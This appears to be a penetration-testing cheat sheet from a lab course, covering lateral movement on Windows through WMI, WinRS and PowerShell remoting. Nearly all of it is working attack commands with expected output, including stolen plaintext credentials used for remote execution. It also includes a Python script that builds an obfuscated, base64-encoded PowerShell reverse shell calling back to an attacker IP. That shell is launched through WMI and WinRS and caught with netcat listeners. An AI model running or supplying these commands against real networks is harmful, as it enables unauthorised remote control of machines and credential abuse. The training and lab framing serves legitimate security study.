# WMI and WinRM

Running the wmic utility to spawn a process on a remote system
>``` shell
>C:\Users\jeff>wmic /node:192.168.50.73 /user:jen /password:Nexus123! process call create "calc"
>
># ========== Expected Result ==========
>Executing (Win32_Process)->Create()
>Method execution successful.
>Out Parameters:
>instance of __PARAMETERS
>{
>        ProcessId = 5772;
>        ReturnValue = 0;
>};
># =====================================
>```

Creating the PSCredential object in PowerShell
>``` shell
>$username = 'jen';
>$password = 'Nexus123!';
>$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
>$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
>```

Creating a new CimSession
>``` shell
>$options = New-CimSessionOption -Protocol DCOM
>$session = New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $Options 
>$command = 'calc';
>```

Invoking the WMI session through PowerShell
>``` shell
>Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
>```

Executing the WMI PowerShell payload
>``` shell
>PS C:\Users\jeff> $username = 'jen';
>
># ========== Expected Result ==========
>...
># =====================================
>
>PS C:\Users\jeff> Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
>
># ========== Expected Result ==========
>ProcessId ReturnValue PSComputerName
>--------- ----------- --------------
>     3712           0 192.168.50.73
># =====================================
>```

Inspecting The Task Manager
>![](https://raw.githubusercontent.com/caderob/hacker-cheatsheet/main/Images/WMI-and-WinRM-1.png)

Executing the WMI PowerShell payload
>``` shell
>import sys
>import base64
>
>payload = '$client = New-Object System.Net.Sockets.TCPClient("192.168.118.2",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
>
>cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()
>
>print(cmd)
>```

Running the base64 encoder Python script
>``` shell
>kali@kali:~$ python3 encode.py
>
># ========== Expected Result ==========
>powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAU...
>OwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
># =====================================
>```

Executing the WMI payload with base64 reverse shell (1)
>``` shell
>PS C:\Users\jeff> $username = 'jen';
>
>PS C:\Users\jeff> $password = 'Nexus123!';
>
>PS C:\Users\jeff> $secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
>
>PS C:\Users\jeff> $credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
>
>PS C:\Users\jeff> $Options = New-CimSessionOption -Protocol DCOM
>
>PS C:\Users\jeff> $Session = New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $Options
>
>PS C:\Users\jeff> $Command = 'powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5AD...
>HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA';
>
>PS C:\Users\jeff> Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
>
># ========== Expected Result ==========
>ProcessId ReturnValue PSComputerName
>--------- ----------- --------------
>     3948           0 192.168.50.73
># =====================================
>```

Executing the WMI payload with base64 reverse shell (2)
>``` shell
>kali@kali:~$ nc -lnvp 443
>
># ========== Expected Result ==========
>listening on [any] 443 ...
>connect to [192.168.118.2] from (UNKNOWN) [192.168.50.73] 49855
># =====================================
>
>PS C:\windows\system32\driverstore\filerepository\ntprint.inf_amd64_075615bee6f80a8d\amd64> hostname
>
># ========== Expected Result ==========
>FILES04
># =====================================
>
>PS C:\windows\system32\driverstore\filerepository\ntprint.inf_amd64_075615bee6f80a8d\amd64> whoami
>
># ========== Expected Result ==========
>corp\jen
># =====================================
>```

Executing commands remotely via WinRS
>``` shell
>C:\Users\jeff>winrs -r:files04 -u:jen -p:Nexus123!  "cmd /c hostname & whoami"
>
># ========== Expected Result ==========
>FILES04
>corp\jen
># =====================================
>```

Running the reverse-shell payload through WinRS
>``` shell
>C:\Users\jeff>winrs -r:files04 -u:jen -p:Nexus123!  "powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5AD...
>HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"
>```

Veriyfing the origin of the WinRS reverse-shell
>``` shell
>kali@kali:~$ nc -lnvp 443
>
># ========== Expected Result ==========
>listening on [any] 443 ...
>connect to [192.168.118.2] from (UNKNOWN) [192.168.50.73] 65107
># =====================================
>
>PS C:\Users\jen> hostname
>
># ========== Expected Result ==========
>FILES04
># =====================================
>
>PS C:\Users\jen> whoami
>
># ========== Expected Result ==========
>corp\jen
># =====================================
>```

Establishing a PowerShell Remote Session via WinRM
>``` shell
>PS C:\Users\jeff> $username = 'jen';
>
>PS C:\Users\jeff> $password = 'Nexus123!';
>
>PS C:\Users\jeff> $secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
>
>PS C:\Users\jeff> $credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
>
>PS C:\Users\jeff> New-PSSession -ComputerName 192.168.50.73 -Credential $credential
>
># ========== Expected Result ==========
> Id Name            ComputerName    ComputerType    State         ConfigurationName     Availability
> -- ----            ------------    ------------    -----         -----------------     ------------
>  1 WinRM1          192.168.50.73   RemoteMachine   Opened        Microsoft.PowerShell     Available
># =====================================
>```

Inspecting the PowerShell Remoting session
>``` shell
>PS C:\Users\jeff> Enter-PSSession 1
>
># ========== Expected Result ==========
>[192.168.50.73]: PS C:\Users\jen\Documents>
># =====================================
>
>[192.168.50.73]: PS C:\Users\jen\Documents> whoami
>
># ========== Expected Result ==========
>corp\jen
># =====================================
>
>[192.168.50.73]: PS C:\Users\jen\Documents> hostname
>
># ========== Expected Result ==========
>FILES04
># =====================================
>```

Lab 1 - Launch VM Group 1 and repeat the steps discussed in this section. Which PowerShell cmdlet has been used to create a WMI session?
>``` shell
>
>```
>

Lab 2 - Start VM group 2. After logging in as jeff on client74, use Jen’s credentials in Listing 8 to move laterally to web04 and retrieve the flag from the Administrator's desktop.
>``` shell
>
>```
>
